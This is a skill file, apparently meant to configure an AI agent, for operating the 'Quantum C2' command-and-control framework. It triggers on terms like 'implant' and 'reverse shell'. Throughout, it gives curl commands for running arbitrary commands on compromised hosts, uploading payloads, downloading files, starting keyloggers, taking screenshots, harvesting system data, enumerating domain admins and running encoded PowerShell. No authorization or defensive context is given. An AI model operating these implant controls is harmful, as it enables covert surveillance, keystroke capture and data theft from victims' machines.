---
name: quantum-c2-sessions
description: >
  C2 session management for Quantum C2. Use when the user needs to create, manage, monitor, or interact with C2 implant sessions. Covers session lifecycle, command execution, file operations, and real-time monitoring. Triggers on: "session", "implant", "reverse shell", "C2 session", "connect session", "session management", "command execution", "shell access".
---

# Quantum C2 Session Management Skill

Manage C2 implant sessions and execute commands.

## Session Lifecycle

### List All Sessions
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/
```

### Get Session Details
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/{session_id}
```

### Kill Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/kill \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Close Session
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/close \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Command Execution

### Execute Command
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami && id && uname -a"}'
```

### Get Output
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/{id}/output
```

### Task Queue
```bash
curl -H "Authorization: Bearer $C2_TOKEN" http://localhost:8000/api/sessions/{id}/tasks
```

## Real-Time Interaction (WebSocket)

### Session Terminal
```
ws://localhost:8000/api/sessions/ws/{session_id}
```

### Multi-Session Monitor
```
ws://localhost:8000/api/sessions/ws/monitor
```

### WebSocket Message Types
```json
{"type": "session_info", "data": {...}}
{"type": "output", "data": "command output..."}
{"type": "command_result", "data": {...}}
{"type": "screenshot", "data": "base64..."}
{"type": "keylogger", "data": {...}}
{"type": "process_list", "data": [...]}
{"type": "file_list", "data": [...]}
```

## File Operations

### List Files
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /tmp"}'
```

### Upload File
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/files/upload \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/tmp/payload","data":"<base64_encoded_content>"}'
```

### Download File
```bash
curl -O http://localhost:8000/api/sessions/{id}/files/download/{filepath} \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Process Management

### List Processes
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ps aux"}'
```

### Kill Process
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"kill -9 <pid>"}'
```

## Keylogger

### Start Keylogger
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/keylogger/start \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Stop Keylogger
```bash
curl -X POST http://localhost:8000/api/sessions/{id}/keylogger/stop \
  -H "Authorization: Bearer $C2_TOKEN"
```

### Get Records
```bash
curl -H "Authorization: Bearer $C2_TOKEN" \
  http://localhost:8000/api/sessions/{id}/keylogger/records
```

## Screenshot

```bash
curl -X POST http://localhost:8000/api/sessions/{id}/screenshot \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Harvest System Info

```bash
curl -X POST http://localhost:8000/api/sessions/{id}/harvest \
  -H "Authorization: Bearer $C2_TOKEN"
```

## Session Data Model

```python
SessionInfo {
    session_id: str           # sess-{12hex}
    target_ip: str
    target_port: int
    platform: str             # windows/linux/macos/android/ios
    implant_type: str
    status: str               # active/inactive/closed
    connected_at: float
    last_activity: float
    hostname: str
    username: str
    architecture: str
    process_id: int
    privilege: str            # user/admin/root
    bytes_sent: int
    bytes_recv: int
    working_dir: str
    keylogger_active: bool
}
```

## Common Commands

### Windows
```bash
# System info
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"systeminfo & net user & net group \"domain admins\""}'

# PowerShell
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"powershell -EncodedCommand <base64>"}'
```

### Linux/macOS
```bash
# System info
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami; id; uname -a; hostname; last; who"}'

# Network
curl -X POST http://localhost:8000/api/sessions/{id}/execute \
  -H "Authorization: Bearer $C2_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"ip addr; netstat -tulpn; route -n"}'
```
